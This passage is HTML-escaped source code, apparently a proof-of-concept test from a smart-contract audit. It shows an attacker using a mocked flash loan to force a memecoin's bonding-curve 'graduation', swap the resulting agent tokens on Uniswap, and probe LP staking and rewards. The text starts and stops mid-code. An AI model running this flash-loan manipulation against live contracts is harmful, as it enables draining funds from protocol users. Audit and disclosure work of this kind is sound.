.connect(founder)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .launchFor(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u0026quot;Cat\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u0026quot;$CAT\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        [0, 1, 2],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u0026quot;cat memecoin\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u0026quot;\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        [\u0026quot;\u0026quot;, \u0026quot;\u0026quot;, \u0026quot;\u0026quot;, \u0026quot;\u0026quot;],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        parseEther(\u0026quot;200\u0026quot;),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        founder.address\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const tokenInfo = await bonding.tokenInfo(await bonding.tokenInfos(0));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Token created:\u0026quot;, tokenInfo.token);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Step 1: Attacker takes out flashloan (virtual token)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Use direct mint to mock flashloan interaction\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const flashLoanAmount = parseEther(\u0026quot;100000\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken.mint(trader.address, flashLoanAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;Flash loan acquired:\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      formatEther(flashLoanAmount),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;VIRTUAL\u0026quot;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Step 2: Attacker uses flashloan to buy memecoin and trigger graduation\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken.connect(trader).approve(fRouter.target, flashLoanAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Record token balances before attack\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const initialBalances = {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      traderVirtualBefore: await virtualToken.balanceOf(trader.address),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      pairVirtualBefore: await virtualToken.balanceOf(tokenInfo.pair),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      founderCatBefore: await ethers\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        .getContractAt(\u0026quot;IERC20\u0026quot;, tokenInfo.token)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        .then((token) =\u0026gt; token.balanceOf(founder.address)),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Initial balances:\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;- Trader VIRTUAL:\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      formatEther(initialBalances.traderVirtualBefore)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;- Pair VIRTUAL:\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      formatEther(initialBalances.pairVirtualBefore)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;- Founder CAT:\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      formatEther(initialBalances.founderCatBefore)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Buy memecoin with flashloaned funds to trigger graduation\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await expect(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      bonding.connect(trader).buy(parseEther(\u0026quot;35000\u0026quot;), tokenInfo.token)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    ).to.emit(bonding, \u0026quot;Graduated\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Check if token graduated\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const tokenInfoAfterGraduation = await bonding.tokenInfo(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      bonding.tokenInfos(0)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(tokenInfoAfterGraduation.agentToken).to.not.equal(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;0x0000000000000000000000000000000000000000\u0026quot;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(tokenInfoAfterGraduation.tradingOnUniswap).to.equal(true);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Agent token created:\u0026quot;, tokenInfoAfterGraduation.agentToken);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Record trader\u0026#39;s CAT token balance\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const traderCatBalance = await ethers\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .getContractAt(\u0026quot;IERC20\u0026quot;, tokenInfo.token)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .then((token) =\u0026gt; token.balanceOf(trader.address));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Trader CAT balance:\u0026quot;, formatEther(traderCatBalance));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Step 3: Unwrap tokens to receive agent tokens\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await bonding\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .connect(trader)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .unwrapToken(tokenInfo.token, [trader.address]);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Check agent token balance after unwrapping\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentToken = await ethers.getContractAt(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;IERC20\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      tokenInfoAfterGraduation.agentToken\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const traderAgentTokenBalance = await agentToken.balanceOf(trader.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;Trader agent token balance after unwrap:\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      formatEther(traderAgentTokenBalance)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Step 4: Trade agent tokens for virtual tokens in Uniswap pair\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // We need to get uniswap pair and router\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const uniswapFactory = await ethers.getContractAt(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;IUniswapV2Factory\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.UNISWAP_FACTORY\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const uniswapPair = await uniswapFactory.getPair(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      virtualToken.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      tokenInfoAfterGraduation.agentToken\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Uniswap pair:\u0026quot;, uniswapPair);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const uniswapRouter = await ethers.getContractAt(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;IUniswapV2Router02\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.UNISWAP_ROUTER\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Approve agent tokens to be spent by router\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentToken\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .connect(trader)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .approve(uniswapRouter.target, traderAgentTokenBalance);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Swap agent tokens for virtual tokens\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await uniswapRouter\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .connect(trader)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .swapExactTokensForTokensSupportingFeeOnTransferTokens(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        traderAgentTokenBalance,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        0, // Accept any amount of tokens\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        [tokenInfoAfterGraduation.agentToken, virtualToken.target],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        trader.address,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        Math.floor(Date.now() / 1000) + 60 * 20 // 20 minutes from now\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Step 5: Check balances after swap to verify flash loan repayment\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const finalVirtualBalance = await virtualToken.balanceOf(trader.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;Final trader VIRTUAL balance:\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      formatEther(finalVirtualBalance)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Verify that trader has enough to repay flash loan\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Flash loan amount:\u0026quot;, formatEther(flashLoanAmount));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;Difference:\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      ((flashLoanAmount - finalVirtualBalance) * 100n) / flashLoanAmount\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // A typical flash loan would require the balance to be \u0026gt;= the loan amount\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Due to fees and taxes, there should be a small difference\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Step 6: Check if the uniswap LP tokens are automatically staked in veToken\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Since this is the first agent created, its ID should be 1\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const virtualId = 1;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const lpInfo = await agentNft.virtualLP(virtualId);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Virtual ID:\u0026quot;, virtualId);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;LP token:\u0026quot;, lpInfo.pool);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;veToken:\u0026quot;, lpInfo.veToken);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Check LP staking\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const veToken = await ethers.getContractAt(\u0026quot;AgentVeToken\u0026quot;, lpInfo.veToken);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const founderVeTokenBalance = await veToken.balanceOf(founder.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;founder veToken balance:\u0026quot;, formatEther(founderVeTokenBalance));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Step 7: Delegate to self to be eligible for rewards\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (founderVeTokenBalance \u0026gt; 0) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await veToken.connect(founder).delegate(founder.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      console.log(\u0026quot;Trader delegated to self\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Step 8: Distribute rewards and verify allocation\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Deploy rewards contract to verify reward allocation\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Setting up rewards contract for validation...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const rewardsFactory = await ethers.getContractFactory(\u0026quot;AgentRewardV3\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const rewards = await upgrades.deployProxy(rewardsFactory, [\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      virtualToken.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      agentNft.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        protocolShares: 1000, // 10%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        stakerShares: 9000, // 90%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      },\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    ]);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await rewards.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Grant governance role to deployer\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await rewards.grantRole(await rewards.GOV_ROLE(), deployer.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Check LP value (should be based on VIRTUAL token in the pool)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const lpValue = await rewards.getLPValue(virtualId);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;LP value for virtualId 1:\u0026quot;, formatEther(lpValue));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Mint some VIRTUAL tokens to distribute as rewards\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const rewardAmount 